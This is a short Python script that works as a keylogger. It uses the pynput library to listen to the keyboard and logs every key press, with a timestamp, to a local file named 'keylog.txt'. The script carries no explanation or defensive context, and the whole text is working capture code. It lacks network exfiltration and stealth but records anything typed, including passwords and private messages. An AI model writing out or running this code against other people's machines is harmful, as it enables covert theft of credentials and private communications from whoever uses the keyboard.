from pynput.keyboard import Key, Listener
import logging

# Set up logging configuration
logging.basicConfig(filename='keylog.txt', level=logging.INFO, format='%(asctime)s: %(message)s')

# Define the function to log keystrokes
def on_press(key):
    logging.info(str(key))

# Set up the listener
with Listener(on_press=on_press) as listener:
    listener.join()
